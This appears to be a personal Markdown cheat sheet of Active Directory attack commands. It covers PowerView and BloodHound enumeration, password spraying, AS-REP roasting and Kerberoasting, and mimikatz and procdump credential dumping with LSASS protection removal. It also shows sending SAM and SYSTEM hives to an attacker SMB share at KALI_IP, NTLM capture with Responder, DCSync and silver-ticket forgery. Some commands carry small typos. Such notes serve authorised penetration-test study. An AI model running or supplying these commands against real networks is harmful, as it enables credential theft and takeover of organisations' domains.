### ***Obtain as many Hashes and Tickets to re-enumerate (and possibly crack)***

- ***Cyclically enumerate i.e Spray new creds, re-do Bloodhound etc***
- ***Prioritize Bloodhound (will most likely show you the path after careful enumeration)***

# ***Bloodhound***
***RE-ENUMERATE AFTER PRIVESC!*** 
```shell
powershell -ep bypass

. .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "hound_NAME"
```
# *PowerView*
```shell
powershell -ep bypass

. .\PowerView.ps1
```
## Users / Groups / DC
```shell
########
# User #
########
net user /domain
net user "TARGET_USER" /domain
Get-DomainUser
Get-DomainUser -Username "TARGET_USER"
Get-DomainUser -AdminCount | select name,whencreated,pwdlastset,lastlogo


#########
# Group #
#########
net group /domain
net group "TARGET_GROUP" /domain
Get-DomainGroup -MemberIdentity "TARGET_USER" [ | "TARGET_GROUP" ]

# All Groups and their members
Get-DomainGroup | Get-DomainGroupMember | Select GroupName,MemberName | Sort GroupName

# Groups w/ LA rights
Get-NetGroupMember -GroupName "Local Admin"

# All Groups in DC and their members
Get-DomainController | Get-NetLocalGroup | Select -ExpandProperty GroupName | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName

# Local groups
Get-NetLocalGroupMember | ft
Get-NetLocalGroup | Get-NetLocalGroupMember
Get-NetLocalGroup | ?{$_.Members -like "*Admin*"}


#################
# Get DCs / PDC #
#################
Get-DomainController
Get-Domain | Select-Object 'PdcRoleOwner'


############################
# All Computers in domains #
############################
Get-DomainComputer 
Get-DomainComputer | Select Name,Description | Sort Name

```
## Local Admin Check (LAr)
```shell
Find-LocalAdminAccess
Invoke-EnumerateLocalAdmin [ -CopmuterName client74 ]
Find-DomainLocalGroupMember [ -CopmuterName client74 ]
```
## Sessions/LoggedOn (LAr)
```shell
# Sessions (NetSessionEnum, SrvsvcSessionInfo key for remote read)
# NEED LAr from 
# 10 1607+ / 2016+
Get-NetSession -ComputerName MS01 -Verbose
Get-NetSession -ComputerName MS02 -Verbose


# Logged-On Users (LAr, NetWkstsUserEnum,remoteregistry enabled)
# Disabled-default in
# 8+
# Enabled-default in Windows Server 
# >= 
# 2012 R2, 
# 2016 (1607), 
# 2019 (1809),
# Server 2022 (21H2)
Get-NetLoggedon
Get-NetComputer | Get-NetLoggedon
Get-DomainComputer | Get-LoggedonLocal
Get-NetLoggedon -ComputerName MS01
Get-LastLoggedOn -ComputerName <Hostname>
Get-LoggedonLocal -ComputerName <Hostname>


# PsLoggedon.exe (if no error message remoteregistry probably disabled) or could be a false positive
.\PsLoggedon.exe \\MS02
```
## ACLs/ACEs/GPOs
```powershell
############
# Outbound #
############
IdentityReferenceName -HAS-[ActiveDirectoryRights]-ON-> ObjectDN

# Interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs | select identityreferencename,activedirectoryrights,acetype,objectdn | fl

# All ACLs of interest (uses all the perms)
Find-InterestingDomainAcl -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword"} | select identityreferencename,activedirectoryrights,acetype,objectdn | fl

# From a User / Group
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -like "*stephanie*"} | select identityreferencename,activedirectoryrights,acetype,objectdn | fl

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Domain Users"} | select identityreferencename,activedirectoryrights,acetype,objectdn | fl

Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} # Exclude IdentityReference not interested in


###########
# Inbound #
###########
SecurityIdentifier -HAS-[ActiveDirectoryRights]-ON-> Identity

# Auto resolved (may error)
Get-DomainObjectACL -Identity "Management Department" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword" } | select @{Name="ResolvedSecSID";Expression={Convert-SIDToName $_.SecurityIdentifier}},ActiveDirectoryRights,AceType, @{Name="ReadableObjectDN";Expression={(Get-ADObject $_.ObjectDN).Name}} | fl


# Manually if above errors
# 1 Get the SecurityIdentifier SIDS
Get-DomainObjectACL -Identity "Management Department" -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword" | select SecurityIdentifier,ActiveDirectoryRights,AceType,objectdn

# 2 Convert
"SecSID1" [ "SID2" ...] | Convert-SIDToName


# Rights of interest
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACEs applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
## Shares
***Examine / Look for interesting files (ex. shows GPP password discovered on DC)***
1. ***SYSVOL** is of interest; It may include files and folders that reside on the domain controller itself*
2. ***Mapped to** %SystemRoot%\SYSVOL\Sysvol\domain-name on DC !!*
3. ***Contains** policies and scripts*
```shell
# Find available shares on hosts in the current Domain
ls \\<DC>\sysvol\<domain>\
cp \\<DC>\sysvol\<domain>\* .
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml

Copy-Item -Path \\<DC>\sysvol\domain\* -Recurse -Destination PATH

Find-DomainShare [ -Verbose ]
Get-NetShare -ComputerName <Host>

# Only shares the current user has read access
Find-DomainShare -CheckShareAccess -Domain DOMAIN -DomainController DCIP

# Get all file servers on Domain
Get-DomainFileServer
```
## Files
```shell
# Various
Find-InterestingDomainShareFile [ -verbose ]
Find-InterestingDomainShareFile -Include *.ps1,*.bak,*.vbs,*.config,*.conf,*old*
Find-InterestingDomainShareFile -OfficeDocs
Find-InterestingDomainShareFile -Terms account*,pass*,secret*,conf*,test*,salar*

# Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

# Individual examples
Find-InterestingDomainShareFile -Include *.conifg | Select -ExpandProperty "Path" | Sort | Out-File "Config-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include *.bak| Select -ExpandProperty "Path" | Sort | Out-File "Bak-files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include *unattend* | Select -ExpandProperty "Path" | Sort | Out-File "Unattend.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include *.bat | Select -ExpandProperty "Path" | Sort | Out-File "Batch-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include *.ps1 | Select -ExpandProperty "Path" | Sort | Out-File "PS1-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include *dll.conf* | Select -ExpandProperty "Path" | Sort | Out-File "DLLConfig-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include *sql* | Select -ExpandProperty "Path" | Sort | Out-File "SQL-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include test* | Select -ExpandProperty "Path" | Sort | Out-File "Test-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include passw* | Select -ExpandProperty "Path" | Sort | Out-File "Password-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include secret* | Select -ExpandProperty "Path" | Sort | Out-File "Secret-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include salar* | Select -ExpandProperty "Path" | Sort | Out-File "Salary-Files.txt" -Encoding "ASCII"
Find-InterestingDomainShareFile -Include account* | Select -ExpandProperty "Path" | Sort | Out-File "Account-Files.txt" -Encoding "ASCII"

```
## User Hunting
```shell
# Find computers where domain administrators or specified user / group has session
Invoke-UserHunter
Invoke-UserHunter -Domain <Domain>
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth # Makes less noise
Invoke-UserHunter -CheckAccess # Check if accessible

# Find computers where all and any users / groups have session
Invoke-UserHunter -ShowAll
Invoke-UserHunter -ShowAll -CheckAccess # Check if accessible
```

# ***Spray Creds (NXC)***
***SMB WMI SSH LDAP WINRM***
## Check Password Policy
```shell
net accounts
nxc smb `dc` -u 'user' -p 'pass' --pass-pol
```
## Spray
```shell
# Domain / Local
nxc smb `tip` -d `dom` -u users.txt [ | 'user' ] -p passwords.txt [ | 'pass' ] --continue-on-success [ --no-bruteforce ]
nxc smb `tip` -u users.txt [ | 'user' ] -p passwords.txt [ | 'pass' ] --continue-on-success --local-auth [ --no-bruteforce ]

nxc rdp `tip` -d `dom` -u users.txt -p passwords.txt --continue-on-success [ --no-bruteforce ]

# wmi open/closed
nxc wmi `tip` -u users.txt -p passwords.txt --local-auth [ --no-bruteforce ] # smb open
nxc wmi `tip` -d `dom` -u james -p 'J@m3s_P@ssW0rd!' [ --no-bruteforce ] # smb closed
```
# ***Asreproast***
## impacket / nxc
```shell
# Impacket
impacket-GetNPUsers -dc-ip `dc` `dom`/USER [ -p PASS | -hashes :HASH ] -request [ -format [hashcat|john] ] -outputfile hashes.asreproast [ -debug ]
impacket-GetNPUsers -dc-ip `dc` `dom`/ -request [ -format [hashcat|john] ] -usersfile users.txt [ -k ticket.ccache ] -no-pass [ -debug ]

# NXC
nxc ldap `tip` -u 'user' -p 'pass' --asreproast output.txt
```
## PV / rubeus
```shell
# PowerView
Get-DomainUser -PreauthNotRequired | select UserPrincipalName

# Rubeus
.\Rubeus.exe asreproast /nowrap /format:[hashcat/john] /outfile:hashes.asreproast
```

***targeted Asreproast***
*No Asreproastable Users → **have GenericWrite or GenericAll on a User** → Reset their passwords OR Modify Kerberos pre-auth in UAC → Now ASREPRoast this user*
```shell
# A) Specific user target
Set-DomainObject -Identity <user> -Set @{'userAccountControl'=(Get-DomainUser -Identity <user>).userAccountControl -bor 4194304}

# B) Enable All privously disabled
Get-DomainUser -DoesNotRequirePreAuth $false | ForEach-Object {Set-DomainObject -Identity $_.samaccountname -Set @{'userAccountControl'=$_.userAccountControl -bor 4194304}}
```

# ***Kerberoast (Du)***
## impacket / nxc
```shell
# Impacket
impacket-GetUserSPNs -dc-ip `dc` `dom`/USER[:PASS] -hashes :HASH -request [ -request-user SPN ] -outputfile hashes.kerberoast

# NXC
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```
## PV / rubeus
```shell
# PowerView
Get-DomainUser -SPN
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | select -ExpandProperty Hash
Get-DomainUser -Identity <User> | Get-DomainSPNTicket -Format Hashcat | select -ExpandProperty Hash

# Rrubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

***targeted Kerberoast***
***GenericWrite or GenericAll on user account** → could reset password OR could SET SPN for that user and Kerberoast → Now Kerberoast this user*
```shell
# 1 GET services of interest 
Get-DomainUser -SPN

# 2 SET our controlled user
Set-DomainObject -Identity TARGETUSER -Set @{serviceprincipalname='testdomain.local/myspnX'}

# 3 Now Kerberoast
# https://medium.com/@mayank_prajapati/all-you-need-to-know-about-kerberoasting-7215de0462c8
```
# *Dump SAM/SYSTEM/LSA/LSASS Hashes (LA)*
## impacket  / nxc
```shell
# secretsdump (Remote dump)
impacket-secretsdump `dom`/'AdminUser'[:'pass']@`tip` -hashes :HASH [ -k ccachefile -no-pass ]

# reg.py (Local dump in Kali)
# 1 Start smb server
impacket-smbserver smb . -smb2support [ -username user -password pass ]

# 2 Save each hive manually
impacket-reg `dom`/'AdminUser'[:'pass']@`tip` save -keyName 'HKLM\SAM' -o '\\KALI_IP\smb'
impacket-reg `dom`/'AdminUser'[:'pass']@`tip` save -keyName 'HKLM\SYSTEM' -o '\\KALI_IP\smb'
impacket-reg `dom`/'AdminUser'[:'pass']@`tip` save -keyName 'HKLM\SECURITY' -o '\\KALI_IP\smb'
# or all at once
impacket-reg `dom`/'AdminUser'[:'pass']@`tip` backup -o '\\KALI_IP\smb'

# 3
impcaket-secretsdump -sam 'sam' -security 'security' -system 'system' LOCAL

# NXC
nxc smb `tip` -u 'AdminUser' -p 'pass' --sam [ --lsa | --ntds ]
```
## mimikatz / reg
```shell
# Mimikatz
privilege::debug
token::elevate

# Use this if above doesn't fully give results
sekurlsa::logonpasswords # use this if above doesn't fully give results
!+ # if logonpasswords returns an error, do this and the below
!processprotect /process:lsass.exe /remove
# then try sekurlsa::logonpasswords again

# SAM (LOCAL) / LSA (DOMAIN) / LSASS (Users logged on since last reboot)
lsadump::sam /patch
lsadump::lsa /patch OR lsadump::lsa /inject
sekurlsa::msv

# Windows Cred Manager hashes
sekurlsa::credman # Windows Cred Manager hashes


# Reg
# 1 Save the files
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
# reg save HKLM\SECURITY "C:\Windows\Temp\security.save"

# 2 Transfer to Kali and dump
impacket-secretsdump -sam sam.save -system system.save [ -security security.save ] local


# Others
procdump -accepteula -ma lsass.exe lsass.dmp

Task Manager → Right click lsass.exe → Create dump file
Control Panel → User Accounts → Credential Manager
```
## NTLM Capture via UNC
```shell
# 1 Use Responder OR impacket-smbserver
sudo responder -I tap0

impacket-smbserver smb . -smb2support

#  2 Force auth
dir \\KALI_IP\path\to\test
```
# *dcsync(LADC,NTDS)*
***Can obtain ALL USER HASHES via targeted attack***
## impacket-secretsdump
```shell
# NTLM hashes and Kerberos keys
impacket-secretsdump -just-dc `dom`/AdminUser[:pass]@`dc` -hashes :HASH
# Options
# -just-dc-user TARGETUSER
# -just-dc-ntlm ⇒ only NTDS.dit data (NTLM hashes only)
```
## mimikatz
```shell
# Mimikatz
privilege::debug
token::elevate

lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
lsadump::dcsync /domain:[domain] /all /csv
# NTDS.dit (equivalent of -just-dc in impacket-secretsdump)
```

# ***Silver Ticket (LAr)***
***Accessing SPN services as PRIV USER through forged service tickets***
***NEED:***
1. _**SPN hash** (impacket or mimikatz)_
2. _**Domain SID** (everything upto last dash - from whoami /user)_
3. _**SPN resource name** (setspn.exe or Get-NetUser -SPN)_
4. _**Target Domain User** (for the /user option)_
## impacket
```shell
# 1 Obtain SPN NTLM hash (secretsdump or mimikatz)

# 2 GET Domain SID (from one of below)
impacket-lookupsid `dom`/'user'[:'pass']@`tip` -H :HASH
nxc ldap `dc` -u 'pass' -p 'pass' -k --get-sid

# 3 FORGE the TGS
impacket-ticketer -domain `dom` -nthash :SPNHASH -domain-sid SID -spn SERVICE/`dom` USER
```
## mimikatz
```shell
privilege::debug
token::elevate

# REPLACE ALL CAPPED stuff w/ appropriate things
sekurlsa::logonpasswords
kerberos::golden /sid:DOMAINSID /domain:DOMAIN /ptt /target:WEB04.CORP.com /service:HTTP /rc4:SPNHASH /user:USER
```
# *List Tickets (Du)*
## PS
```shell
klist
```
## mimikatz / rubeus
```shell
privilege::debug
token::elevate

# Current Session tickets on the host
kerberos::tgt
kerberos::list

# ALL Tickets from ALL Sessions on the host
sekurlsa::tickets

# injects into LSASS memory so don’t do it if there’s a monitoring service
# add /export to any of these to export but first base64 /out:true and base64 /in:true to export base64 encoded (less likely to be detected)


# Rubeus
# List Current session TGT (interval is the time between harvests in sec )
.\Rubeus.exe harvest /interval:30

# List Current session all tickets with logon id and expiration time
.\Rubeus.exe triage

# List Current session tickets with detailed info
.\Rubeus.exe klist

# Exxtract All tickets (basically /export for mimikatz)
.\Rubeus.exe dump
# /user:[user] for a specific user
# /service:[service] for a specific service
# /luid:[logon id] for specific session, if we have access to all sessions (admin)
# /nowrap ⇒ easier copy-and-paste
```
## impacket-mimikatz
```shell
# 1 need to run rpc::server from mimikatz
privilege::debug
token::elevate

rpc::server
> BindString[0]: ncacn_ip_tcp:DC[61057]

# 2 Can run mimikatz shell now
impacket-mimikatz -dc-ip `dc` `dom`/'user':['pass']@`tip` -H :HASH


# ONE liner
impacket-mimikatz "privilege::debug; token::elevate; sekurlsa::tickets"
```

# ***Request Tickets (DU)***
## TGT
### impacket
```shell
impacket-getTGT -dc-ip `dc` domain/user:password
export KRB5CCNAME=[ticket].ccache
```
### mimikatz / rubeus
```shell
privilege::debug
token::elevate

tgt::ask /domain: /user: /password:


# b) Rubeus
.\Rubeus.exe asktgt /domain: /user: /password:
# Options
# /enctype:[rc4|aes128|aes256|3des]
# use aes256 (default) for enctype
# if you don’t have password but have hash, replace /password: with /rc4: /aes128: /aes256: or /des:
```
## TGS
### impacket
```shell
impacket-getST -dc-ip `dc` [domain]/[user]:[password] -spn [service]/[host]
# Options
# -hashes [hash]
# -impersonate [user]
# Note: Automatically modifies impersonate TGS so it can be used with other impacket tools.
```
### mimikatz / rubeus
```shell
privilege::debug
token::elevate

kerberos::ask /target:[SPN]/[FQDN]
# /export to export


# b) Rubeus
.\Rubeus.exe asktgs /service:[SPN]/[FQDN]
# Options
# /enctype:
# /user:[username]  
# /password:[password]
# if you don’t have password but have hash, replace /password: with /rc4: /aes128: /aes256: or /des:
```
## Convert tickets
```shell
impacket-ticketConverter admin.kirbi admin.ccache

# https://en.hackndo.com/kerberos/
# https://medium.com/@mayank_prajapati/all-you-need-to-know-about-kerberoasting-7215de0462c8
```
# ***Utils***
## Get DCIP
```shell
# NXC
nxc ldap `dc` -u 'user' -p 'pass' --dc-list
```
## Get Domain SID
```shell
# PV
Get-DomainSID

# NXC
nxc ldap `dc` -u 'user' -p 'pass' -k --get-sid

# Impacket
impacket-lookupsid guest@`dc` -no-pass
```
## Get SPNs
*Services launched by system itself will have **LocalSystem**, **LocalService**, or **NetworkService** SAs*
```shell
# All SPNs in Domain
Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'} # SAs in "Domain Admins"


# b) setspn.exe
setspn -L
setspn -L iis_service
```
## Check SYSVOL folder
***Can access GPPs and other interesting files***

```shell
# Path is usually mapped to below in DC
%SystemRoot%\SYSVOL\sysvol\domain-name 
C:\Windows\SYSVOL\sysvol\domain-name

# impacket-smbclient
impacket-smbclient domain/user%password@`dc` [ -k -no-pass ]

# smbmap
smbmap -H `dc` -d `dom` -u "user" -p "password" -r SYSVOL

# smbclient
smbclient \\\\`tip`\\SYSVOL  -U USER --pw-nt-hash HASH
```
## Connect to SYSVOL
```shell
# PS
net use s: \\<DC>\SYSVOL
cd s:
dir

# GUI
File Explorer → \\<DC>\\SYSVOL
```
## Check SPN access
```
iwr -UseDefaultCredentials http://web04
```
## Convert SID to Name
```shell
# mulitple
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

# single
Convert-SidToName "S-1-5-21-1987370270-658905905-1781884369-553"

Convert-NameToSID "stephanie"
```
## mimikatz oneliner
```shell
.\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam /patch" "lsadump::sam" "sekurlsa::msv" "lsadump::secrets" "lsadump::lsa" "lsadump::lsa /patch" "lsadump::cache" "sekurlsa::logonpasswords full" "sekurlsa::ekeys" "sekurlsa::dpapi" "sekurlsa::credman" "vault::list" "vault::cred /patch" "exit"
```
## Atlernate Cred / Secure Cred
```shell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('User', $SecPassword)
Get-DomainUser -Credential $Cred
```
## Convert SID to Name
```shell
# mulitple
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

# single
Convert-SidToName "S-1-5-21-1987370270-658905905-1781884369-553"

Convert-NameToSID "stephanie"
```
